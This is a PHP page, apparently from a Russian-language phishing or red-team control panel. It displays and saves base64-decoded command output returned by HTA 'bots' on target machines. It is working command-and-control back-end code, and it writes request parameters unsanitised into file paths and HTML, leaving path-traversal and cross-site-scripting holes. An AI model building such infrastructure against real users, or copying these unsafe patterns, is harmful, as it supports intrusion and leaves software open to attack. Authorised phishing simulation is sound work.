<!DOCTYPE html>
<html lang="en">

<head>

    <meta charset="utf-8">
    <meta http-equiv="X-UA-Compatible" content="IE=edge">
    <meta name="viewport" content="width=device-width, initial-scale=1">
    <meta name="description" content="">
    <meta name="author" content="">

    <title>HTA.Детали</title>

    <!-- Bootstrap Core CSS -->
    <link href="../css/bootstrap.min.css" rel="stylesheet">

    <!-- Custom CSS -->
    <link href="../css/sb-admin.css" rel="stylesheet">

    <!-- Custom Fonts -->
    <link href="../font-awesome/css/font-awesome.min.css" rel="stylesheet" type="text/css">

    <!-- HTML5 Shim and Respond.js IE8 support of HTML5 elements and media queries -->
    <!-- WARNING: Respond.js doesn't work if you view the page via file:// -->
    <!--[if lt IE 9]>
        <script src="https://oss.maxcdn.com/libs/html5shiv/3.7.0/html5shiv.js"></script>
        <script src="https://oss.maxcdn.com/libs/respond.js/1.4.2/respond.min.js"></script>
    <![endif]-->

</head>

<body>

    <div id="wrapper">

        <!-- Navigation -->
        <nav class="navbar navbar-inverse navbar-fixed-top" role="navigation">
            <!-- Brand and toggle get grouped for better mobile display -->
            <div class="navbar-header">
                <button type="button" class="navbar-toggle" data-toggle="collapse" data-target=".navbar-ex1-collapse">
                    <span class="sr-only">Toggle navigation</span>
                    <span class="icon-bar"></span>
                    <span class="icon-bar"></span>
                    <span class="icon-bar"></span>
                </button>
                <div style="margin:-10px 0 0 10px"><a class="navbar-brand" href="index.php"><img src="../css/logo1.png" width="100px"></a></div>
            </div>
            <!-- Top Menu Items -->
            <ul class="nav navbar-right top-nav">
                <li class="dropdown">
                    <a href="#" class="dropdown-toggle" data-toggle="dropdown"><i class="fa fa-user"></i> admin <b class="caret"></b></a>
                    <ul class="dropdown-menu">
                        <li>
                            <a href="#"><i class="fa fa-fw fa-power-off"></i> Log Out</a>
                        </li>
                    </ul>
                </li>
            </ul>
            <!-- Sidebar Menu Items - These collapse to the responsive navigation menu on small screens -->
            <div class="collapse navbar-collapse navbar-ex1-collapse">
                <ul class="nav navbar-nav side-nav">
                    <li>
                        <a href="../"><i class="fa fa-dashboard"></i> Статистика</a>
                    </li>
                    <li class="active">
                        <a href="index.php"><i class="fa fa-bug"></i> HTA</a>
                    </li>
                     <li>
                        <a href="../phishing/"><i class="fa fa-certificate"></i> Фишинг</a>
                    </li>
                    <li>
                        <a href="../makros/"><i class="glyphicon glyphicon-play-circle"></i> Макросы</a>
                    </li>
                    <li>
                        <a href="../usb/"><i class="fa fa-flag"></i> USB</a>
                    </li>
                    <li>
                        <a><i class="glyphicon glyphicon-list-alt"></i> Шаблоны</a>
                        <ul id="demo">
                            <li>
                                <a href="../template/">Готовые</a>
                            </li>
                            <li>
                                <a href="../template/deployed.php">Развернутые шаблоны</a>
                            </li>
                            <li>
                                <a href="../template/new.php">Загрузить новый</a>
                            </li>
                            <li>
                                <a href="../template/delete.php">Удалить</a>
                            </li>
                        </ul>
                    </li>
                    <li>
                        <a><i class="glyphicon glyphicon-file"></i> Создание отчета </a>
                        <ul id="demo1">
                            <li>
                                <a href="../report/">Создать отчет</a>
                            </li>
                            <li>
                                <a href="../report/statistic.php">Статистика</a>
                            </li>
                        </ul>
                    </li>
                    <li>
                        <a href="../guides/"><i class="glyphicon glyphicon-film "></i> Гайды по настройке</a>
                    </li>
                    <li>
                        <a href="../wiki/"><i class="glyphicon glyphicon-info-sign"></i> Вики</a>
                    </li>
                </ul>
            </div>
            <!-- /.navbar-collapse -->
        </nav>

        <div id="page-wrapper">

            <div class="container-fluid">

                <!-- Page Heading -->
                <div class="row">
                    <div class="col-lg-12">
                        <h1 class="page-header">
                            .HTA
                            <small>Просмотр выполненных команд</small>
                        </h1>
                        <ol class="breadcrumb">
                            <li>
                                <i class="fa fa-dashboard"></i>  <a href="../index.php">Статистика</a>
                            </li>
                            <li>
                                <i class="fa fa-bug"></i> <a href="index.php">HTA</a>
                            </li>
                            <li>
                            <?php
                            $user = htmlspecialchars($_GET['i']);
                            echo "<i class='fa fa-align-justify'></i> <a href='view_user.php?id=$user'> Команды для бота</a>";
                            ?>
                            </li>
                            <li class="active">
                                <i class="fa fa-align-justify"></i> Детали
                            </li>
                        </ol>
<!-- Таблица -->            

                       

<?php
include ("../bd.php");

$command_id = mysqli_escape_string($link,$_GET['id']);
$client_id = mysqli_escape_string($link, $_GET['i']);

$query = mysqli_query($link,"SELECT command_id, part_id, data FROM replies WHERE command_id='$command_id' ORDER BY part_id");
$decode = "";
while($row = mysqli_fetch_array($query,MYSQLI_NUM)){

$pole3=$row[2];
$decode = "".$decode."".trim($pole3)."";


}
$decode =preg_replace('/\s+/', '', $decode);
$dec = trim($decode, "\n");
echo "<div style='float:left;margin-right:50px'>
    <span style='color:#333333'>Нажми на форму,чтобы выделить весь Base64 код:<span><br>
    <input onClick='this.select();' style='background:#ffffff;border:2px solid #DDDDDD' size='45' value=$dec />


      </div><br>
     <div style='margin-top:-25px;'> 
    <p style='margin:20px 0 0 30px'><a href='download.php?file=$client_id-$command_id.txt' style='border-radius:4px;padding:10px;border:1px solid #DDDDDD;color:#333333'>Скачать файл</a></p>
     </div><br><br>
     "


      ;


$total = base64_decode($decode); //декодиннг 
$str = mb_convert_encoding($total, "utf-8", "windows-1251"); // конвертация в читаемый вид
$output = preg_replace('/ {2,}/', '<br>' , $str); // заменяем 2 пробела переносом строки
echo'<div width="300px"><pre>';
echo $output;
echo'</pre></div>';

$fp = fopen("files/".$client_id."-".$command_id.".txt", "w");
fwrite($fp, $total);
fclose($fp);

?>


                        </div>
<!-- /Таблица -->       </div>
                    </div>
                </div>
                <!-- /.row -->

            </div>
            <!-- /.container-fluid -->

        </div>
        <!-- /#page-wrapper -->

    </div>
    <!-- /#wrapper -->

    <!-- jQuery -->
    <script src="../js/jquery.js"></script>

    <!-- Bootstrap Core JavaScript -->
    <script src="../js/bootstrap.min.js"></script>

</body>

</html>
